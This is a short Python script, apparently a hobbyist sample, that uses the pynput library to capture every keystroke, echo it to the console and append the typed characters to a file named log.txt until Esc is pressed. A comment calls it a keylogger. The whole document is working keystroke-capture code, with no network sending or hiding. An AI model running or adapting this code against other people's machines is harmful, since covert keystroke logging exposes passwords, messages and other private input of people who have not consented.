import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))          
    count += 1
    if count > 10:                                          
        count = 0                               
        writefile(keys)                  #python keylogger it runs until we click esc button
        keys = []

def writefile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k= str(key).replace("'", "")
            Key.space
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
            


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()